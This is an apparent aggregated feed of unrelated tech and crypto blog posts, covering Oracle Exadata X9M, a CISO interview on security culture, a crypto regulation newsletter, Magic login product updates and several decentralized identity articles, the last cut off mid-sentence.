<p>Do such solutions even exist today? Yes, and one notable example is <a href="https://www.oracle.com/engineered-systems/exadata/">Oracle Exadata</a>, which is a combination of a hardware platform optimized for OLTP and OLAP Oracle Database workloads and the database management software to run on it. Introduced back in 2008 as a high-performance platform to run Oracle Database on-premises, since 2015 it also powers the company’s cloud services. Exadata offers identical capabilities on-prem, in the Oracle public cloud, and as the Exadata Cloud@Customer private database cloud service in customers’ data centers. It is also the foundation of one of the company’s flagship database products – the <a href="https://www.kuppingercole.com/blog/balaganski/for-oracle-the-future-is-autonomous">Oracle Autonomous Database</a>.</p>
<p>Yesterday, the company <a href="https://www.oracle.com/news/announcement/oracle-introduces-next-generation-exadata-x9m-platforms-2021-09-28/">introduced a new generation of the platform, Exadata X9M</a>. From the hardware perspective, it is based on a shared Persistent Memory architecture and Remote Direct Memory Access (RDMA) that powers massive improvements in IOPS and latency compared to commodity hardware. Exadata Cloud@Customer X9M allows organizations to have Oracle manage the private database cloud infrastructure deployed in their data center with a single-rack system providing up to 992 vCPUs, more than 11 TB of memory, and intelligent storage servers with up to 576 CPU cores for SQL processing, 18 TB of Intel Optane persistent memory (PMem), and 769 TB of usable storage capacity. This provides unprecedented performance for OLTP workloads, with up to 22.4M read IOPS and ultra-low I/O latency of less than 19 microseconds - up to 87% better performance at the same price, effectively lowering the cost of running databases by nearly 50%.</p>
<p>Running the Autonomous Database on Exadata Cloud@Customer X9M in customer datacenters or on Exadata in Oracle Cloud Infrastructure enables fully elastic scaling of database compute consumption and supports the full range of automated maintenance capabilities (patching, backup, performance tuning, etc.) regardless of whether it is deployed on-prem or in the cloud. New Operator Access Control capabilities on Exadata Cloud@Customer ensure that all access to customer databases is highly regulated and based on strict principles of Privileged Access Management so even Oracle cloud operators can’t access the data or make unapproved changes to the system. Most crucially, however, all customer data always resides in the same single database, accessible for any kind of transactional,&nbsp; analytical, or document workload, and is always encrypted to ensure its security and compliance posture.</p>
<p>With this news, Oracle has clearly elevated the customer expectations for a database cloud service and is on a trajectory of demonstrable rapid innovation. Simply put, other database cloud services, based on separate code bases and engines, don’t come close to matching the capabilities of Oracle Autonomous Database on the Exadata platform.</p>
<p>Still, for quite a few companies, especially those focusing on open-source and cloud-native development, this approach towards data management might look controversial at the first glance. What about the freedom from vendor lock-in? Isn’t Oracle software always very expensive? To answer these questions, one has to consider the numerous benefits of Oracle’s approach: an architecture, where all data and multiple types of workloads reside in a single, strongly secured data platform without the need to ever migrate them to a different one (and remember, migrating between on-prem and the cloud is completely transparent since both run the same database software and on the same Exadata infrastructure).</p>
<p>Combined with the promise of up to 50x performance improvement compared to Oracle’s competitors, the resulting total costs of running critical business applications on Oracle often turns out to be even lower than relying on random tools and multiple cloud databases, when you include the time and money needed to move data among them. Also, let’s not forget that Oracle Database can run virtually anywhere you want—on a Dell server, in AWS, on an Exadata—it’s the customer’s choice. The same cannot be said about “cloud-native” database services like AWS Aurora and Redshift—they can only be run in the public cloud, as not even AWS Outposts supports them on-premises.</p>
<p>Customers who run their Oracle Databases on Exadata simply attain net incremental capabilities that don’t exist anywhere else. In this regard, one should carefully consider what “vendor lock-in” even means nowadays and which option gives customers more freedom. In the end, only you can decide what kind of setting your crown jewels are worth. Just keep your mind open to all available alternatives and focus on business results, not philosophical arguments.</p>

<p>To give you a sneak preview of what to expect, we asked Rinki some questions about her upcoming presentation.</p>
  
 How do you see the role of a CISO today and in the future? 
<p>The role of the CISO has transformed, right? When I started my career, the word CISO didn't really exist outside of banking. I started my career in a utility company. There was no CISO there. In fact, one of the companies I went to work for in tech very early in my career, they had hired the first non-bank CISO. And I remember when I started the CISO role was just starting to come to bear, and folks were just starting to learn what a CISO did. And now it's every company, it's almost mandate that you have to have a security leader in place. And the security leader has taken various forms. And depending on company to company that you go to, the CISO is not like a CFO or a Chief Legal Officer with very defined structure in how those functions usually perform, how they report, how they are organized. The CISO is still kind of varying, and it's still being defined, in company to company, in some companies it's a very business risk compliance function and others, it's more of a technical function that's developing architectures for different products, in others, it's just a compliance function. It just depends, but the amazing part is that the CISO role is almost at every company that you look at now, and even start-ups are thinking very early about bringing a CISO in early on.</p>
<p>And, now more than ever, I think you're starting to see the development of risk committees in addition to audit committees and board meetings at companies. CISOs are not just presenting at the board. They might be presenting at the audit committee, at the risk committee, and the CISO role now you see more CISOs serving on boards as well. The value of a Chief Information Security Officer has just grown tremendously. And I think in the future, we'll see, hopefully more and more non-tech boards have CISOs on them and the CISOs just having a very powerful role in a company, helping enable the business strategy, which is already starting to happen. But I think we're going to see, just a complete elevation of this role.</p>
 In your experience, what are the most difficult challenges for organisations to transform their existing culture into a security culture? 
<p>I think the toughest part around security culture is it's all about how do you win the hearts and minds, right? You can develop security standards all day. You can build tools all day. But who cares if nobody cares, if there's a way to bypass it and folks don't really take to heart why this is important, then you're really losing the essence of security and winning the hearts and minds, I think is a very, very, very hard job. You have to understand how a person works. That person might be in the development org., they might be in the engineering org., or they might be in the legal org. or the marketing org., and you have to think about what they care about, how they work and then really bring the right data to them to say, this is why this is important and figuring out in the context of your company, how do you build that culture?</p>
<p>And it varies from company to company. I remember at a very engineering heavy culture that I worked in, we had to bring proof of how we could attack the app that they had built to make them really believe that they had to understand security in a more meaningful way and when they saw their own app, that they had developed, being attacked like that, I think that's what won their hearts and minds to say “Oh, wow, okay. That now I really do understand why this is important”. And bringing data to the discussion, I think always helps in transforming security culture. And that data varies depending on what team it is that you're trying to influence. I would say one thing I also learned is that information security has been something that organically grows in the company and you kind of see where it starts really small and it’s a grassroots effort and then it starts kind of growing.</p>
<p>Although that can be effective, it's a lot slower than having top-down championship. And what I mean by that is having your executive team at the highest levels, championing security, winning their hearts and minds first and making them your biggest champions and allies and driving the security culture. And if you have that at the top, I think it makes it a lot easier and you can run security then a lot faster and companies who do that well, I think they see their business runs faster because security becomes an enabler. And you don't see as many incidents and having to go and firefight later on.</p>
 Could you give us a sneak peek into your FireSide Chat: “Transforming Security Culture”? 
<p>Yeah. I'm looking forward to doing the fireside chat. And I think some of the things that I hope to share are some of the things we talked about today at a deeper level, but I think there's a lot more to it, right? When you're transforming a security culture, it also matters that your information security team, how you've built that, who you've brought on board - that their mindset itself is in a good place as well. And I think, in this past year, we've gone through a lot, past year and a half. Gosh, it will almost be two years with COVID, right. We've gone through a lot.</p>
<p>You know, we've seen not only just because of the pandemic, but there's a lot of world events and things that affect mental health and so forth, which makes people prone to more mistakes. I think sharing some of my personal stories on what I went through during that time, and how, coming to a company in a hundred percent high remote environment, having to build trust in a remote environment like that, and then having to build security culture was extremely challenging. But here I am one year into the role and we've made major progress. And I think, in the fireside chat, I'm really excited to get deeper into those stories and, share with all of you, my learnings.</p>

 GiD Report#179 — Crypto crackdowns continue, but Twitter doubles&nbsp;down <p>Welcome to The GiD Report, a weekly newsletter that covers GlobaliD team and partner news, market perspectives, and industry analysis. You can <a href="https://medium.com/global-id/gid-report-178-the-wsjs-fb-investigation-and-gary-gensler-s-senate-testimony-36a7aec242c7">check out last week’s report&nbsp;here</a>.</p><p>This week:</p>  The global crypto crackdown continues  What people are&nbsp;saying  Chart of the week (China bans&nbsp;crypto)  Twitter doubles down on&nbsp;Bitcoin  Chart of the week (DeFi&nbsp;rising)  Stuff happens   1. The global crypto crackdown continues <p>First, China continues turning up the heat on its crypto ban. According to Coindesk:</p><blockquote>Authorities in China’s Inner Mongolia province <a href="https://www.coindesk.com/policy/2021/09/27/inner-mongolia-seizes-10100-mining-rigs-from-government-tech-park/">seized 10,100 crypto mining rigs</a> from a government-operated tech park, according to local media. This comes days after top government officials renewed a crackdown on crypto trading and mining. Separately, Huobi Global announced Sunday it would <a href="https://www.coindesk.com/markets/2021/09/26/huobi-to-gradually-expel-its-china-users-in-wake-of-ban-token-slides-to-8-month-low/">stop serving existing users in China</a> by the end of the&nbsp;year.</blockquote><p>In response to increasing regulatory pressure, crypto exchange <a href="https://www.coindesk.com/business/2021/09/24/ftx-moves-headquarters-from-hong-kong-to-bahamas-report/">FTX moved its HQ from Hong Kong to the&nbsp;Bahamas</a>.</p><p>We’re feeling the heat here in the U.S. as well. The Biden administration is set to appoint a <a href="https://www.bloomberg.com/news/articles/2021-09-22/biden-to-tap-crypto-big-bank-critic-to-run-wall-street-watchdog">crypto</a> (and <a href="https://www.nytimes.com/2021/09/23/business/saule-omarova-comptroller-currency.html">Big Bank</a>) critic to run the Office of the Comptroller of the Currency. (Contrast this to crypto-friendly Brian Brooks, who ran the same office under&nbsp;Trump.)</p><p>The Biden administration is also going after crypto payments in its fight against ransomware. Here’s <a href="https://www.nytimes.com/2021/09/21/us/politics/treasury-department-combating-ransomware-cryptocurrency.html">the NYTimes</a> (via&nbsp;<a href="http://global.id/rcb">/rcb</a>):</p><blockquote>The Biden administration took action on Tuesday to crack down on the growing problem of ransomware attacks, expanding its use of sanctions to cut off digital payment systems that have allowed such criminal activity to flourish and threaten national security.</blockquote><blockquote>The Treasury Department said it was imposing sanctions on a virtual currency exchange called Suex, in the administration’s most pointed response to a scourge that has disrupted U.S. fuel and meat supplies this year, when foreign hackers locked down corporate computer systems and demanded large sums of money to free&nbsp;them.</blockquote><p>Three states are also going after Celsius, saying that the crypto lender violates securities law. Here’s <a href="https://www.coindesk.com/policy/2021/09/17/3-states-alabama-securities-commission-also-claims-celsius-violated-securities-laws/">Coindesk</a>:</p><blockquote>In an order dated Sept. 16, the state regulator said it believes Celsius violated state laws through its “Earn Rewards” program. Texas and New Jersey state regulators announced similar findings on Friday, with New Jersey filing a cease-and-desist and Texas announcing it would hold a hearing in February to determine if a cease-and-desist should be&nbsp;ordered.</blockquote><blockquote>Celsius has 28 days to respond to the Alabama regulator and show cause why the regulator should not impose a cease-and-desist order. If the company does not respond, the regulator will assume Celsius is waiving its right to a hearing and immediately move to impose sanctions.</blockquote><p>And the big news, of course, is that Coinbase has canceled the launch of its new lending program following the SEC’s threat to sue. Here’s <a href="https://blockworks.co/coinbase-cancels-plans-to-launch-lending-program/?oly_enc_id=3914C9559689A4M">Blockworks</a>:</p><blockquote>The company said in <a href="https://blog.coinbase.com/sign-up-to-earn-4-apy-on-usd-coin-with-coinbase-cdad79e5f5eb">a blog post</a> on Friday that it was making “the difficult decision” not to launch the initiative, which would have allowed eligible customers to earn interest on select assets on Coinbase, starting with 4% annual percentage yield, or APY, on USD Coin (USDC). Coinbase has also discontinued the waitlist for this&nbsp;program.</blockquote><blockquote>“We had hundreds of thousands of customers from across the country sign up and we want to thank you all for your interest,” the Sept. 17 Coinbase blog states. “We will not stop looking for ways to bring innovative, trusted programs and products to our customers.”</blockquote><p>With crypto hovering at around $2 trillion in value as mainstream adoption expands, this was always going to be the new normal. This next chapter will be figuring out how to build necessary bridges between the crypto world and the regulated mainstream reality.</p> Relevant:   Via <a href="http://global.id/rcb">/rcb </a>— <a href="https://www.nytimes.com/2021/09/21/us/politics/treasury-department-combating-ransomware-cryptocurrency.html">The Biden administration is combating ransomware with a crackdown on cryptocurrency payments.</a>  Via <a href="http://global.id/j">/j</a> — <a href="https://www.bloomberg.com/news/articles/2021-09-24/china-deems-all-crypto-related-transactions-illegal-in-crackdown">China Widens Ban on Crypto Transactions; Bitcoin&nbsp;Tumbles</a>  <a href="https://www.nytimes.com/2021/09/24/business/dealbook/stablecoin-crypto-regulation.html">Here Come the Crypto&nbsp;Rules</a>  <a href="https://blockworks.co/coinbase-cancels-plans-to-launch-lending-program/?oly_enc_id=3914C9559689A4M">Coinbase Cancels Plans to Launch Lending Program — Blockworks</a>  <a href="https://www.coindesk.com/policy/2021/09/17/3-states-alabama-securities-commission-also-claims-celsius-violated-securities-laws/?utm_source=Sailthru&amp;utm_medium=email&amp;utm_campaign=NODE%20SEPT%2020%202021&amp;utm_term=The%20Node">3 States: Alabama Securities Commission Also Clawims Celsius Violated Securities Laws</a>  <a href="https://www.wsj.com/articles/china-declares-bitcoin-and-other-cryptocurrency-transactions-illegal-11632479288?mod=djem10point">China Declares Cryptocurrency Transactions Illegal; Bitcoin Price&nbsp;Falls</a>   2. What people are&nbsp;saying <p>Here’s Kraken’s legal chief <a href="https://news.bloomberglaw.com/securities-law/fantasy-to-not-expect-regulation-crypto-exchange-lawyer-says">Marco Santori speaking speaking with last&nbsp;week</a>:</p><blockquote>“You’re just living in a fantasy world if you don’t believe that this industry is going to face heavier, more Wall Street-like regulation from governments in the U.S. and abroad, and Kraken has simply been practical about that future,” Santori said on Bloomberg’s “QuickTake Stock” broadcast Thursday.</blockquote><blockquote>“I’ve certainly followed Brian’s tweets, and I’ll say that look, you’re just not being honest with yourself about the crypto community if a little bit of you doesn’t think he’s saying what a lot of people are thinking,” Santori said. “I can’t support that kind of approach with regulators. It’s never been successful historically and from our experience, we’ve found the SEC to be open to discussion.”</blockquote> 3. Chart of the week&nbsp;(1/2) <p>(Sent from a friend, source unknown):</p> 4. Twitter doubles down on&nbsp;Bitcoin Jack Dorsey, Photo: TED Conference<p>Twitter announced a slew of new crypto features last Thursday that included crypto tipping and NFT profile verification.</p><p>Here’s <a href="https://www.coindesk.com/business/2021/09/24/twitters-new-crypto-features-are-a-bfd/">Coindesk’s David Morris</a> (via <a href="http://global.id/gregkidd">/gregkidd</a>):</p><blockquote>I think Thursday’s announcement of new crypto features on Twitter is of a similar significance. First up is a tipping feature that will connect profiles to Bitcoin and Lightning Network addresses (as well as other payments services). The service isn’t available on Android yet, so I haven’t been able to use it. But early glimpses show a streamlined and intuitive experience that looks set to smoothly onboard new bitcoin users. Twitter also says it will implement non-fungible token (NFT) verification on the platform soon, though no firm timeline was announced.</blockquote><blockquote>…</blockquote><blockquote>NFT verification, however, will be a step change. The feature is still in development but it will provide some way of confirming and visually conveying that an NFT displayed in a Twitter profile is authentic, and that it is owned by the same person as the Twitter profile. As we’ve discussed in these pages at length, NFTs are a novel and powerful way to flex and show community affiliations online, but this integration will make those claims vastly clearer and more powerful.</blockquote><p>Meanwhile, in El Salvador, there’s more crypto wallets than banks only a month after it became legal tender, <a href="https://www.coindesk.com/policy/2021/09/27/almost-a-third-of-salvadorans-are-using-the-bitcoin-wallet-bukele-says/">according to Coindesk</a>:</p><blockquote>Almost a third of Salvadorans, or about 2 million people, are actively using the state-issued Chivo bitcoin wallet, according to President Nayib Bukele. If the figure is accurate, more people are using cryptocurrency than any particular bank in El Salvador less than a month after BTC became legal tender&nbsp;there.</blockquote> Relevant:   <a href="https://www.theinformation.com/articles/jack-dorsey-s-square-moves-closer-to-a-bitcoin-exchange">Jack Dorsey’s Square Moves Closer to a Bitcoin&nbsp;Exchange</a>  <a href="https://www.axios.com/twitter-new-features-tips-creators-7eb10779-b4cb-41d3-84bc-b157c04a6563.html">New features spread Twitter’s wings</a>  <a href="https://techcrunch.com/2021/09/23/twitter-accelerates-again-with-bitcoin-tips-nfts-recorded-spaces-creator-fund-and-more/">Twitter accelerates again with Bitcoin tips, NFTs, recorded Spaces, creator fund and more — TechCrunch</a>   5.

<p>We’ve launched new features that give you more control to tailor your users’ experience signing into your application.</p><p>In this post, I’ll cover a round-up of the most recent product&nbsp;updates.</p> Allow List and Block&nbsp;List <p>Last month, we released Allow List and Block List, an access control feature that helps you easily manage who is and isn’t allowed to log in to your app from the ease of your Magic Dashboard. No code is&nbsp;needed.</p><p>Access can be gated in 2 ways: explicitly allowing only certain emails and domains through with<a href="https://magic.link/docs/customization/access-control#allow-list"> Allow List</a>, or blocking certain emails and domains with<a href="https://magic.link/docs/customization/access-control#block-list"> Block List</a>. For example, you can specify a unique email address like email@magic.link. Alternatively, you can use a domain wildcard like *@magic.link for additional flexibility. Up to 20,000 specific email addresses or domains to be added to your Allow List or Block&nbsp;List.</p><p>We’ve heard from our customers that this capability comes in handy for many use cases. Some of the most popular we heard&nbsp;include:</p>  Rolling out a private beta for your&nbsp;app  Managing access for a gated community  Working on a membership-based app or&nbsp;service  <p>To get started, head to the Settings tab to toggle on an <a href="https://magic.link/docs/customization/access-control">Allow List or Block&nbsp;List</a>.</p> Customizable Sessions <p>Now with Magic, we have made it easy for you to customize your user’s session length all without the need to write an additional line of code. Our new refresh token persists without requiring your users to re-authenticate for up to 90 days. Not only this, the refresh token works with privacy browsers and browsers with 3rd party cookies disabled, providing a persistent session for your&nbsp;users.</p><p>From the Magic dashboard, navigate to Session Management under your app Settings page and toggle on Auto Refresh. You have the flexibility to pick session lengths ranging between 7 days and 90 days. The feature is available for email and all social login&nbsp;methods.</p> Microsoft and Twitch OAuth&nbsp;Support <p>We’ve expanded our list of federated social login providers to include <a href="https://magic.link/docs/social-login/microsoft">Microsoft</a> and <a href="https://magic.link/docs/social-login/twitch">Twitch</a>. These providers allow your users to register or sign in using Microsoft or Twitch to your app. The Magic client SDKs are available in Javascript, React, and mobile platforms iOS and&nbsp;Android.</p> ✨Magic Community <p>Beyond new features and capabilities aimed at making the developer and end-user experience better, we are also focused on supporting the Magic community (that’s you!). It’s simple: we 💜 to connect, share, and learn together with developers around the&nbsp;world.</p> 👋Join us on&nbsp;Discord! <p>Everyone is invited to join us on Discord, where the Magic team and community gathers to chat, as well as help answer questions you might&nbsp;have.</p><p>Whether you’re a developer or just keen to<a href="https://community.magic.link/"> join the discussion</a> on auth, decentralized identity, or other modern infra like blockchain — come and say&nbsp;hi!</p><p>One of our community members, dng from London, asked an excellent question:</p><p>Here’s how you can contribute and make the most out of the community:</p>  Share product feedback directly with the Magic&nbsp;team  Become a <a href="https://magic-fortmatic.typeform.com/to/Wgzsocor">Guest Author</a> to teach members through tutorials and&nbsp;blogs  Talk about your favorite tech at Close-up Magic meetups as a special&nbsp;guest  Connect with other members in a monthly Community Call  Celebrate wins&nbsp;together  <p>We would love to have you with us on this journey and can’t wait to see what you build with&nbsp;Magic.</p> <p><a href="https://medium.com/magiclabs/magic-product-updates-september-edition-2c6659bcb7e1">Magic Product Updates: September Edition</a> was originally published in <a href="https://medium.com/magiclabs">Magic</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

				  The world will move towards decentralized identity if we make it easy for them to do so—and easy means, above all, fast. The solution is machine readable governance—a smart way of implementing rules for how to manage trust.  
			  
				
				
				 If you want a high-speed train to go fast, you need the right kind of track. It needs to be laser-straight, have few, if any, crossings, and be free of slower freight trains. Unfortunately, the U.S. has, mostly, the wrong kind of rails: lots of crossings, lots of freight trains, and lots of curvy and unaligned tracks. One section of the Northeast Corridor can’t handle train speeds above 25mph. And while billions will soon be spent on new high-speed trains that are lighter, more capacious, and more energy efficient, they will still run on the same rails at the same speeds. <p></p>
<p>As we race ahead with decentralized identity networks—Ontario’s announcement of its Digital ID program is the most visible sign yet that we are in an accelerating phase of a paradigm shift on identity—we face lots of infrastructural choices, the answers to which could put us in an Amtrak-like bind.</p>
<p>If you think of a decentralized identity network as a set of rails that allow information to be issued, shared, and verified, this process should be as frictionless and fast as possible; and it is, because it is powered by software—called agents— that enable consent and trust at every point in the system. Once you decide that an issuer of a verifiable credential is trustworthy, verifying their credentials is straightforward. You can also apply all kinds of rules at the agent level to govern more complex information requirements in a frictionless, automatic way. A verifier agent could be programmed to accept only certain kinds of tests from a laboratory, or only tests from approved laboratories at a national or international level. The ability to do this instantaneously is essential to adoption.</p>
<p>This is why machine-readable governance, which takes place at the agent layer, is integral to the successful deployment of any kind of decentralized trusted data ecosystem: It’s a real-time way to handle governance decisions—the Boolean choreography of ‘if this, then that’— in the most frictionless way possible. This also means that a network can organize itself and respond as locally as possible to the constant flux of life and changes in information and rules. Not everybody wants the same thing or the same thing forever. </p>
<p>Machine-readable governance therefore functions as a trust registry—literally a registry of who to trust as issuers and verifiers of credentials—and as a set of rules as to how information should be combined, and for whom, and in which order. It can also power graphs—sets of connections—between multiple registries. This means that different authority structures can conform to existing hierarchical governance structures—or to self-organize. Some entities may publish their ‘recipe’ for interaction including requirements for verification, while others may simply refer to other published governance. When everyone knows each other’s requirements, we can calibrate machine-readable governance to satisfy everyone’s needs in the most efficient way possible.</p>
<p>Choreographing this complex workflow at the agent level delivers the speed needed by users. </p> 
			  
				
				
				  The elements of machine-readable governance  
			  
				
				
				
			  
				
				
				 <p>Machine-readable governance is composed of elements that help to establish trust and enable interoperability: trusted participants, schemas (templates for structuring information in a credential), and rules and flows for presenting credentials and verifying them. Machine-readable governance can be hierarchical. Once a governance system is published, other organizations can adopt and then amend or extend the provided system.</p>
<p>In the diagram above, Government A has published a complete set of governance rules.</p>
<p>Government B selected Schema 1 for use and added its own rule and flow to the governance from Government A.</p>
<p>Federal Medical Assn. C created its own list of trusted issuers (C1, C2), selected Schema 1 for use, and layered&nbsp; customized governance on top of the governance that Government A publishes.</p>
<p>State Medical Assn. D has taken the layered governance selected by Federal Medical Assn. C and duplicated everything except its list of issuers.</p> 
			  
				
				
				 <p>If we have this fantastic, high-speed way to verify in decentralized networks where, then, is the Amtrak problem?</p>
<p>It lies in the belief that the best way to do governance is to divert all traffic through a centralized trust registry. This trust registry will be run by a separate organization, third party business, or consortium which will decide on who is a trusted issuer of credentials—and all parties will consult this single source of trust.</p>
<p>Here’s why this isn’t a good idea:</p>
<p>First, the point of high-speed rails is speed. If you must ping the trust registry for every look up, then you have created a speed limit on how fast verification can take place. It will slow down everything.</p>
<p>Second, a trust registry creates a dependence on real-time calling when the system needs to be able to function offline. A downloadable machine-readable governance file allows pre-caching, which means no dependence on spotty connectivity. Given that we want interoperable credentials, it’s a little bit naïve and first-world-ish to assume the connection to the trust registry will always be on.</p>
<p>Third, a centralized trust registry is unlikely to be free or even low cost, based on non-decentralized real-world examples. Being centralized it gets to act as a monopolist in its domain, until it needs to interact with another domain and another trust registry. Before you know it, we will need a trust registry of trust registries. With each layer of bureaucracy, the system gets slower and more unwieldy and more expensive.</p>
<p>This kind of centralized planning is likely to only benefit the trust registry and not the consumer. And it can all be avoided if governments and entities just publish their rules. The kicker is that as the trust registries currently envisioned cannot yet accommodate rules for choreographing presentation and verification, it’s literally a case of ripping up the high-speed track and replacing it with slower rails.</p>
<p>Yes, the analogy with Amtrak isn’t exact. The tracks that crisscross the U.S. are legacy tech while decentralized identity is entirely new infrastructure. But trust registries are an example of legacy thinking, of bolting on structures conceived for different systems and different infrastructural capacities.</p>
<p>We can, with machine-readable governance, have smart trust registries that map to the way governments, local, federal, and global, actually make decisions and create rules.</p>
<p>We also move further away from a model of trust that depends on single, centralized sources of truth, and toward zero trust-driven systems that enable fractional trust—lots of inputs from lots of sources that add up to more secure decision making.</p>
<p>But most of all, we use the rails we’ve built to share information in a secure, privacy-preserving way in the fastest, most efficient way possible.</p>

 This is an ongoing series featuring Ontology’s Harbingers. Harbingers are exceptional leaders that help Ontology grow its community and ecosystem, making it an ever-stronger blockchain, and decentralized identity and data&nbsp;leader. <p>In the eighth interview in this series, Ontology speaks with <a href="https://t.me/andreidita">Andrei</a>, administrator of our <a href="https://t.me/OntologyNetwork">English</a> and <a href="https://t.me/ontologyromania">Romanian</a> Communities.</p> 1. How did you hear about Ontology? What drew you to Ontology? <p>I heard about Ontology in late December, 2017, on Neo’s Discord. Since I was a Neo supporter, I decided to take a deeper look at what Ontology wanted to do. Also, since I’m a philosopher, it seemed very intriguing to see such a philosophical concept as the name of the&nbsp;project.</p> 2. What made you become a supporter of Ontology and a champion of its&nbsp;brand? <p>Basically, the concepts and goals described in their White Paper, especially the goal to build artificial trust using blockchain infrastructure. This goal, if it’s achieved, will have a great impact upon&nbsp;society.</p> 3. What do you see as the key role of a Harbinger? What is your favorite thing about being a Harbinger? <p>I think the key role of a Harbinger is to promote the blockchain vision to those new to the subject and also to enlighten those already into blockchain about the importance of Ontology’s vision in this landscape. My favorite thing about being a Harbinger is being involved in creative discussions with like-minded people about technologies like decentralized identity.</p> 4. Why is being part of the Ontology community important to&nbsp;you? <p>Being part of the Ontology community is important to me because I truly think blockchain technology is a key aspect in making the world a better place. Also, since Ontology focuses on fundamental issues like distributed trust and digital identity, I can witness first hand how these ideas are taking&nbsp;shape.</p> 5. How is Ontology’s community different from other blockchain communities, is there anything that makes it stand&nbsp;out? <p>I would say that Ontology’s community is both friendly and helpful. Every time someone is in need of help, both admins and community members will put in the extra effort to make sure the issue is solved in the best way possible.</p> 6. What do you use as your key channels for engagement with the Ontology community and why? Would you like to see any&nbsp;others? <p>The main channel I use is <a href="https://t.me/ontologyromania">Telegram</a>, followed by Discord. I prefer to interact with others in live discussions, therefore these platforms are appropriate.</p> 7. Can you share a memorable experience or something you’ve learned from being a Harbinger? What advice would you give to someone looking to become a Harbinger? <p>The best memory I have is helping people who were panicking about losing their assets. Their happiness when the issue was solved gave me a great&nbsp;feeling.</p><p>The advice I would give to someone looking to become a Harbinger is to always do his best to try to understand the viewpoint of the other party, especially when what others are saying might trigger adverse reactions on your&nbsp;behalf.</p> 8. How would you describe the Ontology community in three&nbsp;words? <p>Helpful, friendly, mature.</p> 9. How do you think Ontology could expand its community going forward? What would you like to see more/less of? What kinds of things do you see community members do that you think help our community grow? <p>I think with the launching of EVM integration, Ontology should focus on expanding its tech community from the huge reservoir of Ethereum-based developers. The tech community was always a strong point for Ontology but having it expand also to those familiar with Solidity programming could greatly enhance the visibility of the Ontology ecosystem to the large Ethereum-based audience.</p> 10. What do you see as the key milestones for Ontology and how can the community help with achieving these? <p>I think EVM integration is a key milestone which will establish seamless interoperability between Ontology and the Ethereum platform. Also, something that I would like to see in the future would be the ability to link ONT ID with Telegram and use that to whitelist group members. Telegram is the most used platform for crypto and is full of scams, so such a tool would help make it a safer&nbsp;space.</p><p>To learn more about Ontology’s Harbinger Program and how you can get involved, check out our updated&nbsp;<a href="https://medium.com/ontologynetwork/learn-what-it-takes-to-become-the-next-ontology-harbinger-8c55c49dc856">GUIDE</a>.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

 By Humpty&nbsp;Calderon <p>Over the past year, there has been a notable increase of awareness and interest towards decentralized identity solutions. Decentralized identity solutions help users, amongst other things, to control their digital identity without the input of intermediaries. As well as the individual user benefits, decentralized identity solutions have the potential to create seamless, accessible, and verifiable ecosystems. Decentralized identity holds the potential to solve many issues across the DeFi sphere and&nbsp;more.</p> What is decentralized identity? <p>To begin with, it is important to define what we mean by decentralized identity or DID. A DID can be provided to anyone or anything, be it a person, organization, or device. In contrast to typical identifiers such as drivers licenses or passports, DIDs have been designed so that they do not rely on centralized registries, identity providers, or certificate authorities.</p><p>For example, key pairs used for creating digital wallets are siloed to the blockchain where they are created. DIDs on the other hand can operate across a variety of platforms including different blockchains. Together with verifiable credentials (VCs), people can create a more robust version of their identity, linking real-world credentials like your college degrees and certifications, social media accounts, and government-issued documents such as a driver’s license or passport under one secure&nbsp;ID.</p><blockquote>Rather than creating crypto whales, integrating DID into crypto protocols can ensure that participation is open to all and money can be more evenly distributed around ecosystems.</blockquote><p>While identity issuers and verifiers may interact to discover information related to a DID, the design enables the DID holder to have complete control over their identity and data, choosing what information, if any, they wish to share with any other party. What this looks like in reality is that users who make use of decentralized identity protocols, can securely manage their digital identity by storing it on a phone or cloud service with a private key that grants access to the verified user&nbsp;only.</p> What are some of the challenges that DID seeks to&nbsp;solve? <p>Right now crypto mainly revolves around monetary use cases. Exemplifying these are decentralized apps (dApps), which favors capital over membership or contributions made to ecosystems. Plutocratic (one-token-one-vote) systems reinforce an unfortunate cycle that makes most dApps speculative and only beneficial for those with&nbsp;capital.</p><p>A more desirable and egalitarian model would be to create an ecosystem that offers one-human-one-vote use cases. DID can play a role in this, by seeking to provide humans active within the crypto ecosystem with the ability to verify their identity and use their on-chain reputation to create more accessible, secure, and rewarding experiences.</p><p>Rather than creating crypto whales, integrating DID into crypto protocols can ensure that participation is open to all and money can be more evenly distributed around ecosystems. As well as this, one-human-one-vote protocols, backed up by DID can help to more accurately quantify participation in governance, unshrouding the makeup of certain protocols that give members votes based on&nbsp;capital.</p> DeFi <p>When it comes to DeFi, DID can help fix some of the issues associated with airdrops. If projects only airdropped to users verified using DID protocols, they would ensure the fair distribution of tokens across participant pools. Members would have to be authenticated, reducing the potential for bots to drain airdrop contracts, which is a pressing issue for some in the DeFi&nbsp;space.</p><p>DID protocols allow for credit evaluation systems to verify users scores and background based on data stored on blockchain. This means that users can access credit-based lending, whilst still maintaining control of their identity. Through DID, all parties are able to access decentralized financial systems, not just&nbsp;whales.</p><p>Reputation systems that measure on-chain behavior can help to split out responsible borrowers from degens, essentially making the whole system more robust and reliable. DID can facilitate giving users a self-sovereign credit score that they can use to access credit, borrow, and&nbsp;invest.</p> NFT <p>There are exponential benefits wrought from implementing DID solutions in the realm of NFTs. NFTs, which have experienced an unparalleled surge of interest in recent months have many potential use cases, but have been mainly popularized by their usage in digital art. By deploying DID solutions with NFTs, buyers and sellers will be able to verify the creator or any given digital artwork, as well as the collector.</p><p>This ensures that representative value will be transferred to the creator or seller. DID could also be implemented to help keep NFTs in the hands of the communities that support them, instead of scalpers who mint tokens for speculation, raising the price of tokens, making it near impossible for those without capital to access&nbsp;them.</p> DAO <p>DAOs are groups of people working towards a common goal with a shared bank account. Without tools to measure community needs and member contribution, they can fail to assess the needs of their members or fairly incentivize good contributors.</p><p>DAOs using token-based governance prioritize the views and needs of large token holders who may not be active contributors, leaving out groups of people that may be active contributors but not hold large amounts of tokens. DID can enable governance mechanisms that more accurately measure community opinion.</p><blockquote>The more the lines are blurred between digital and physical life, the more our online identities will grow and evolve in complexity.</blockquote><p>It is crucial that DAOs recognize members who are making impactful contributions and reward them accordingly. DIDs can surface member contributions more clearly allowing for incentives to be used to reward and retain good&nbsp;people.</p><p>Furthermore, as DAO members become proficient in their roles, DIDs can allow them to create verifiable resumes to present their contributions to other DAOs who may then assess their value up front and incentivize them accordingly.</p> What are some projects developing DID protocols? <p>Ontology brings trust, privacy, and security to Web 3.0 through decentralized 